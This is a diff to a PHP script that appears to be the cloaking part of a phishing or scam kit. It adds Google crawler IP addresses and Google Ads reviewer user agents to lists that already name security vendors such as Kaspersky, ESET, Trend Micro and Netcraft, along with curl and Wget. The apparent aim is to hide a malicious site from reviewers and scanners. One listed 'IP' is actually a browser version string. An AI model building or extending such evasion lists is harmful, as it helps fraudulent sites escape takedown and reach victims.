@@ -1,5 +1,19 @@
  function spiderip($ip) {
         $spiderip = ['149.154.161.197',
+'66.102.7.198',
+'74.125.210.178',
+'66.102.6.58',
+'66.102.6.40',
+'66.249.88.244',
+'66.249.92.140',
+'66.249.88.252',
+'66.249.88.248',
+'66.102.6.57',
+'66.249.92.142',
+'66.249.66.77',
+'66.249.66.77',
+'66.249.92.141',
+'181.13.64.15',
 '132.191.0.74',
 '190.236.5.167',
 '97.0.4692.98',
@@ -410,7 +424,7 @@
      function agentbot($agent) {
 
         $botheader = array(
-            'google','cortex','msn','googlebot','facebook','Go-http-client','yahoo','eset','kaspersky','trendmicro','ispgateway','Redirect','Python','adsbot','Dataprovider','ips-agent','bingbot','AhrefsBot',
+            'Google','AdsBot-Google','Google-AdWords-Expres','Google-Ads-Creatives-Assistant','google','cortex','msn','googlebot','facebook','Go-http-client','yahoo','eset','kaspersky','trendmicro','ispgateway','Redirect','Python','adsbot','Dataprovider','ips-agent','bingbot','AhrefsBot',
             'Nimbostratus-Bot','NetcraftSurveyAgent','amazonaws','example','cyberghost','kyivstar','.ip-','contaboserver','mailcontrol','msnbot','ny.adsl','linode','axios','ALIONET','lipperhey',
             'googleusercontent','SemrushBot','Internet-structure-research-project-bot','semrush','digikabel','HTTP Banner Detection','gdnplus','nltelcom','Uptimebot','Googlabot','spider','oBot',
             'filterdb','ipip.net','Wget','curl','WhatsApp','Google-Ads','webfoot','Googlebot','Google Favicon','Researchscan','Google-Site-Verification','domainsbot','domainsono','BDFetch','domainsbot',
